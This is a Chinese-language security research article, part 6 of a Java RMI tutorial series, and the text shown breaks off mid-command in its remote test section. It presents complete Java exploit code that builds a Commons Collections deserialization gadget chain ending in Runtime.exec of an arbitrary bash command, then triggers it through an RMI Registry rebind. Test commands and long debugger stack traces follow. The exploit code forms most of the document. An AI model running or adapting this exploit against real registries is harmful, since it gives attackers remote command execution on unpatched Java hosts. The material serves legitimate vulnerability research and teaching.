标题: Java RMI入门(6)

创建: 2020-04-01 16:50
更新: 2020-04-03 16:45
链接: http://scz.617.cn:8/network/202004011650.txt

--------------------------------------------------------------------------

目录:

    ☆ 前言
    ☆ 攻击RMI Registry
        1) RMIRegistryServer.java
        2) EvilRMIRegistryClientWithBadAttributeValueExpException.java
        3) 测试
        4) 简化版调用关系
        5) GeneralInvocationHandler3.java
        6) EvilRMIRegistryClientWithBadAttributeValueExpException3.java
        7) 测试
            7.1) 远程测试
        8) 简化版调用关系(重点看这个)
        9) ysoserial/RMIRegistryExploit
       10) sun.rmi.registry.RegistryImpl.checkAccess
       11) sun.rmi.registry.RegistryImpl_Skel.dispatch
       12) 8u232为什么失败
           12.1) sun.rmi.registry.RegistryImpl.registryFilter
           12.2) sun.rmi.registry.registryFilter属性
           12.3) java.security文件
       13) 为什么CommonsCollections5攻击JDK自带rmiregistry失败
       14) 基于报错回显的PoC
           14.1) DoSomething.java
           14.2) RMIRegistryExploitWithHashtable.java
           14.3) RMIRegistryExploitWithHashtable2.java
           14.4) 测试
               14.4.1) 测试1
               14.4.2) 测试2(connect shell)
               14.4.3) 测试3(rmiregistry)
               14.4.4) 远程测试
    ☆ 参考资源

--------------------------------------------------------------------------

☆ 前言

参看

《Java RMI入门》
http://scz.617.cn:8/network/202002221000.txt

《Java RMI入门(2)》
http://scz.617.cn:8/network/202003081810.txt

《Java RMI入门(3)》
http://scz.617.cn:8/network/202003121717.txt

《Java RMI入门(4)》
http://scz.617.cn:8/network/202003191728.txt

《Java RMI入门(5)》
http://scz.617.cn:8/network/202003241127.txt

本篇讲解1099/TCP周知端口所存在的反序列化漏洞。系列(1)中写过，远程绑定不可
能成功，对源IP有检查，分离周知端口与动态端口到不同主机的尝试失败。所以第一
次看到"ysoserial/RMIRegistryExploit"，我是懵X的，它在远程绑定。跟KINGX讨论
了一下我的困惑，他说对这块也有些迷糊，于是我决定调试一番。由于某些测试用例
涉及"Commons Collections反序列化漏洞"，就先写了系列(5)。现在开始填系列(6)
的坑。并未完结，迭代补齐。

如果从系列(1)追剧一样地追到了系列(6)，应该跟我差不多，开始入门RMI了。

☆ 攻击RMI Registry

本节victim是RMI周知端口，动态端口作为攻击行为的客户端出场。

1) RMIRegistryServer.java

从RMI架构上讲，这是RMI周知端口。

```java
/*
 * javac -encoding GBK -g RMIRegistryServer.java
 * java -Djava.rmi.server.hostname=192.168.65.23 RMIRegistryServer 1099
 */
import java.rmi.registry.*;

public class RMIRegistryServer
{
    public static void main ( String[] argv ) throws Exception
    {
        int port    = Integer.parseInt( argv[0] );
        LocateRegistry.createRegistry( port );
        System.in.read();
    }
}
```

2) EvilRMIRegistryClientWithBadAttributeValueExpException.java

本例所用攻击链有一部分对应"ysoserial/CommonsCollections5"。

从RMI架构上讲，这是RMI动态端口，参看"8.2) HelloRMIDynamicServer.java"。

```java
/*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" EvilRMIRegistryClientWithBadAttributeValueExpException.java
 */
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.registry.*;
import javax.management.BadAttributeValueExpException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

/*
 * 从EvilClientWithBadAttributeValueExpException.java修改而来
 */
public class EvilRMIRegistryClientWithBadAttributeValueExpException
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          addr        = argv[0];
        int             port        = Integer.parseInt( argv[1] );
        String          cmd         = argv[2];
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        Map             normalMap   = new HashMap();
        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
        TiedMapEntry    tme         = new TiedMapEntry( lazyMap, null );
        BadAttributeValueExpException
                        bave        = new BadAttributeValueExpException( null );
        Field           f           = bave.getClass().getDeclaredField( "val" );
        f.setAccessible( true );
        f.set( bave, tme );
        /*
         * 前面在准备待序列化数据，后面是一种另类的序列化过程
         */
        String          name        = "anything";
        HashMap         hm          = new HashMap();
        hm.put( name, bave );
        Class           clazz       = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
        Constructor     cons        = clazz.getDeclaredConstructor( Class.class, Map.class );
        cons.setAccessible( true );
        InvocationHandler
                        ih          = ( InvocationHandler )cons.newInstance( Override.class, hm );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/rmi/Remote.html
         *
         * Remote是个接口，因此可以使用动态代理机制。参看:
         *
         * http://scz.617.cn/misc/201911291425.txt
         *
         * 2.2) TicketServiceClient1.java
         */
        Remote          remoteProxy = ( Remote )Proxy.newProxyInstance
        (
            Remote.class.getClassLoader(),
            new  Class[] { Remote.class },
            ih
        );
        Registry        r           = LocateRegistry.getRegistry( addr, port );
        /*
         * 通过远程绑定触发"RMI Registry"的反序列化漏洞
         */
        r.rebind( name, remoteProxy );
    }
}
```

与HelloRMIDynamicServer不同，本例r.rebind()不会形成阻塞。

3) 测试

java_8_40 \
-Djava.rmi.server.hostname=192.168.65.23 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

8u232不能得手，8u40可以。

java \
-cp "commons-collections-3.1.jar:." \
EvilRMIRegistryClientWithBadAttributeValueExpException 192.168.65.23 1099 \
"/bin/touch /tmp/scz_is_here"

调试RMIRegistryServer:

java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Djava.rmi.server.hostname=192.168.65.23 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [9] org.apache.commons.collections.keyvalue.TiedMapEntry.getValue (TiedMapEntry.java:73), pc = 8
  [10] org.apache.commons.collections.keyvalue.TiedMapEntry.toString (TiedMapEntry.java:131), pc = 20
  [11] javax.management.BadAttributeValueExpException.readObject (BadAttributeValueExpException.java:86), pc = 97
  [12] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [13] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [14] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [15] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [16] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
  [17] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
  [18] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [19] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [20] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
  [21] java.util.HashMap.readObject (HashMap.java:1,396), pc = 225
  [22] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [23] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [24] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [25] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [26] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
  [27] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
  [28] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [29] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [30] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:1,993), pc = 150
  [31] java.io.ObjectInputStream.defaultReadObject (ObjectInputStream.java:501), pc = 41
  [32] sun.reflect.annotation.AnnotationInvocationHandler.readObject (AnnotationInvocationHandler.java:428), pc = 1
  [33] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [34] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [35] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [36] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [37] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
  [38] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
  [39] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [40] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [41] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:1,993), pc = 150
  [42] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,918), pc = 173
  [43] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [44] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [45] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
  [46] sun.rmi.registry.RegistryImpl_Skel.dispatch (null), pc = 370
  [47] sun.rmi.server.UnicastServerRef.oldDispatch (UnicastServerRef.java:410), pc = 100
  [48] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:268), pc = 31
  [49] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
  [50] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
  [51] java.security.AccessController.doPrivileged (native method)
  [52] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
  [53] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:568), pc = 185
  [54] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:826), pc = 685
  [55] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78 (TCPTransport.java:683), pc = 1
  [56] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1.2050827014.run (null), pc = 4
  [57] java.security.AccessController.doPrivileged (native method)
  [58] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:682), pc = 58
  [59] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,142), pc = 95
  [60] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:617), pc = 5
  [61] java.lang.Thread.run (Thread.java:745), pc = 11

这个调用栈回溯实在太深了。

4) 简化版调用关系

--------------------------------------------------------------------------
TCPTransport.handleMessages
  Transport.serviceCall
    UnicastServerRef.dispatch
      UnicastServerRef.oldDispatch
        RegistryImpl_Skel.dispatch
          ObjectInputStream.readObject
            AnnotationInvocationHandler.readObject              // 通过remoteProxy与这个类产生关联
              ObjectInputStream.defaultReadObject               // 跟AnnotationInvocationHandler.invoke没关系
                HashMap.readObject                              // 对应客户端的hm变量
                  ObjectInputStream.readObject
                    BadAttributeValueExpException.readObject    // ysoserial/CommonsCollections5
                                                                // 对应客户端的bave变量
                      TiedMapEntry.toString
                        TiedMapEntry.getValue
                          LazyMap.get                           // 此处开始LazyMap利用链
                            ChainedTransformer.transform
                              InvokerTransformer.transform
--------------------------------------------------------------------------

5) GeneralInvocationHandler3.java

参[57]，作者指出攻击端可以不用AnnotationInvocationHandler，而是自己实现一
个InvocationHandler。

参看:

《Java设计模式之代理模式》
http://scz.617.cn/misc/201911291425.txt

```java
/*
 * javac -encoding GBK -g GeneralInvocationHandler3.java
 */
import java.io.*;
import java.lang.reflect.*;

/*
 * 从GeneralInvocationHandler.java修改而来，多实现一个接口Serializable
 *
 * https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/InvocationHandler.html
 *
 * InvocationHandler is the interface implemented by the invocation
 * handler of a proxy instance. Each proxy instance has an associated
 * invocation handler. When a method is invoked on a proxy instance, the
 * method invocation is encoded and dispatched to the invoke method of its
 * invocation handler.
 */
public class GeneralInvocationHandler3 implements InvocationHandler, Serializable
{
    private Object  realobj;

    public GeneralInvocationHandler3 ( Object realobj )
    {
        this.realobj    = realobj;
    }

    /*
     * This method will be invoked on an invocation handler when a method
     * is invoked on a proxy instance that it is associated with.
     */
    @Override
    public Object invoke ( Object proxy, Method method, Object[] args ) throws Throwable
    {
        /*
         * 转发至目标对象
         */
        Object  obj = method.invoke( realobj, args );
        return( obj );
    }
}
```

6) EvilRMIRegistryClientWithBadAttributeValueExpException3.java

从RMI架构上讲，这是RMI动态端口。

```java
/*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar:." EvilRMIRegistryClientWithBadAttributeValueExpException3.java
 */
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.registry.*;
import javax.management.BadAttributeValueExpException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

/*
 * 从EvilRMIRegistryClientWithBadAttributeValueExpException.java修改而来
 */
public class EvilRMIRegistryClientWithBadAttributeValueExpException3
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          addr        = argv[0];
        int             port        = Integer.parseInt( argv[1] );
        String          cmd         = argv[2];
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        Map             normalMap   = new HashMap();
        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
        TiedMapEntry    tme         = new TiedMapEntry( lazyMap, null );
        BadAttributeValueExpException
                        bave        = new BadAttributeValueExpException( null );
        Field           f           = bave.getClass().getDeclaredField( "val" );
        f.setAccessible( true );
        f.set( bave, tme );
        /*
         * 前面在准备待序列化数据，后面是一种另类的序列化过程
         */
        String          name        = "anything";
        GeneralInvocationHandler3
                        ih          = new GeneralInvocationHandler3( bave );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/rmi/Remote.html
         *
         * Remote是个接口，因此可以使用动态代理机制。参看:
         *
         * http://scz.617.cn/misc/201911291425.txt
         *
         * 2.2) TicketServiceClient1.java
         */
        Remote          remoteProxy = ( Remote )Proxy.newProxyInstance
        (
            Remote.class.getClassLoader(),
            new  Class[] { Remote.class },
            ih
        );
        Registry        r           = LocateRegistry.getRegistry( addr, port );
        /*
         * 通过远程绑定触发"RMI Registry"的反序列化漏洞
         */
        r.rebind( name, remoteProxy );
    }
}
```

7) 测试

假设目录结构是:
.
|
+---test2
|       RMIRegistryServer.class
|       commons-collections-3.1.jar
|
\---test3
        EvilRMIRegistryClientWithBadAttributeValueExpException3.class
        GeneralInvocationHandler3.class
        commons-collections-3.1.jar

为接近现实世界，test2目录下没有GeneralInvocationHandler3.class。

在test2目录执行:

java_8_40 \
-Djava.rmi.server.hostname=192.168.65.23 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

在test3目录执行:

java \
-cp "commons-collections-3.1.jar:." \
EvilRMIRegistryClientWithBadAttributeValueExpException3 192.168.65.23 1099 \
"/bin/touch /tmp/scz_is_here"

与EvilRMIRegistryClientWithBadAttributeValueExpException不同，
EvilRMIRegistryClientWithBadAttributeValueExpException3会抛出异常:

Exception in thread "main" java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
        java.lang.ClassNotFoundException: GeneralInvocationHandler3 (no security manager: RMI class loader disabled)
        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:420)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:268)
        at sun.rmi.transport.Transport$1.run(Transport.java:200)
        at sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78(TCPTransport.java:683)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1/1947500295.run(Unknown Source)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)
        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)
        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)
        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:375)
        at sun.rmi.registry.RegistryImpl_Stub.rebind(RegistryImpl_Stub.java:158)
        at EvilRMIRegistryClientWithBadAttributeValueExpException3.main(EvilRMIRegistryClientWithBadAttributeValueExpException3.java:109)
Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
        java.lang.ClassNotFoundException: GeneralInvocationHandler3 (no security manager: RMI class loader disabled)
        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)
        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:410)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:268)
        at sun.rmi.transport.Transport$1.run(Transport.java:200)
        at sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78(TCPTransport.java:683)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1/1947500295.run(Unknown Source)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.ClassNotFoundException: GeneralInvocationHandler3 (no security manager: RMI class loader disabled)
        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:396)
        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:186)
        at java.rmi.server.RMIClassLoader$2.loadClass(RMIClassLoader.java:637)
        at java.rmi.server.RMIClassLoader.loadClass(RMIClassLoader.java:264)
        at sun.rmi.server.MarshalInputStream.resolveClass(MarshalInputStream.java:214)
        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1613)
        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1518)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1774)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1993)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1918)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)
        ... 16 more

RMIRegistryServer找不到GeneralInvocationHandler3，因为这不是rt.jar中的类，
是个自实现类。

之前读[57]时就在想，周知端口上哪儿找自实现InvocationHandler去？现实世界对
攻击者不会那么友好，远程codebase之类的就不要想了。看到上述异常，差点以为
[57]的作者在胡说八道。不死心地去查了一下/tmp目录，发现touch命令居然执行了。

调试RMIRegistryServer:

java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Djava.rmi.server.hostname=192.168.65.23 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

```java
/*
 * sun.rmi.server.LoaderHandler.loadClass
 *
 * 8u40，361行
 */
private static Class<?> loadClass(URL[] paramArrayOfURL, String paramString)
```

在Eclipse里对上述函数设置条件断点:

arg1.equals("GeneralInvocationHandler3")

命中时调用栈回溯如下:

sun.rmi.server.LoaderHandler.loadClass(java.net.URL[], java.lang.String) line: 364
sun.rmi.server.LoaderHandler.loadClass(java.lang.String, java.lang.String, java.lang.ClassLoader) line: 186
java.rmi.server.RMIClassLoader$2.loadClass(java.lang.String, java.lang.String, java.lang.ClassLoader) line: 637
java.rmi.server.RMIClassLoader.loadClass(java.lang.String, java.lang.String, java.lang.ClassLoader) line: 264
sun.rmi.transport.ConnectionInputStream(sun.rmi.server.MarshalInputStream).resolveClass(java.io.ObjectStreamClass) line: 214
sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readNonProxyDesc(boolean) line: 1613
sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readClassDesc(boolean) line: 1518
sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readOrdinaryObject(boolean) line: 1774
sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject0(boolean) line: 1351
sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).defaultReadFields(java.lang.Object, java.io.ObjectStreamClass) line: 1993
sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readSerialData(java.lang.Object, java.io.ObjectStreamClass) line: 1918
sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readOrdinaryObject(boolean) line: 1801
sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject0(boolean) line: 1351
sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject() line: 371
sun.rmi.registry.RegistryImpl_Skel.dispatch(java.rmi.Remote, java.rmi.server.RemoteCall, int, long) line: not available
sun.rmi.server.UnicastServerRef.oldDispatch(java.rmi.Remote, java.rmi.server.RemoteCall, int) line: 410
sun.rmi.server.UnicastServerRef.dispatch(java.rmi.Remote, java.rmi.server.RemoteCall) line: 268
sun.rmi.transport.Transport$1.run() line: 200
sun.rmi.transport.Transport$1.run() line: 197
java.security.AccessController.doPrivileged(java.security.PrivilegedExceptionAction<T>, java.security.AccessControlContext) line: not available [native method]
sun.rmi.transport.tcp.TCPTransport(sun.rmi.transport.Transport).serviceCall(java.rmi.server.RemoteCall) line: 196
sun.rmi.transport.tcp.TCPTransport.handleMessages(sun.rmi.transport.Connection, boolean) line: 568
sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0() line: 826
sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78() line: 683
sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1.1433130086.run() line: not available
java.security.AccessController.doPrivileged(java.security.PrivilegedAction<T>, java.security.AccessControlContext) line: not available [native method]
sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run() line: 682
java.util.concurrent.ThreadPoolExecutor.runWorker(java.util.concurrent.ThreadPoolExecutor$Worker) line: 1142
java.util.concurrent.ThreadPoolExecutor$Worker.run() line: 617
java.lang.Thread.run() line: 745

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [9] org.apache.commons.collections.keyvalue.TiedMapEntry.getValue (TiedMapEntry.java:73), pc = 8
  [10] org.apache.commons.collections.keyvalue.TiedMapEntry.toString (TiedMapEntry.java:131), pc = 20
  [11] javax.management.BadAttributeValueExpException.readObject (BadAttributeValueExpException.java:86), pc = 97
  [12] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [13] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [14] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [15] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [16] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
  [17] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
  [18] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [19] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [20] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:1,993), pc = 150
  [21] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,918), pc = 173
  [22] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [23] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [24] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:1,993), pc = 150
  [25] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,918), pc = 173
  [26] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [27] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [28] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
  [29] sun.rmi.registry.RegistryImpl_Skel.dispatch (null), pc = 370
  [30] sun.rmi.server.UnicastServerRef.oldDispatch (UnicastServerRef.java:410), pc = 100
  [31] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:268), pc = 31
  [32] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
  [33] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
  [34] java.security.AccessController.doPrivileged (native method)
  [35] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
  [36] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:568), pc = 185
  [37] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:826), pc = 685
  [38] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78 (TCPTransport.java:683), pc = 1
  [39] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1.2050827014.run (null), pc = 4
  [40] java.security.AccessController.doPrivileged (native method)
  [41] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:682), pc = 58
  [42] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,142), pc = 95
  [43] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:617), pc = 5
  [44] java.lang.Thread.run (Thread.java:745), pc = 11

7.1) 远程测试

在192.168.65.23上:

$ ls -l
RMIRegistryServer.class
commons-collections-3.1.jar

java_8_40 \
-Djava.rmi.server.hostname=192.168.65.20 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

在192.168.65.20上:

$ ls -1
EvilRMIRegistryClientWithBadAttributeValueExpException3.class
GeneralInvocationHandler3.class
commons-collections-3.1.jar
ysoserial-0.0.6-SNAPSHOT-all.jar

java_8_232 \
-cp "commons-collections-3.1.jar:." \
EvilRMIRegistryClientWithBadAttributeValueExpException3 192.168.65.23 1099 \
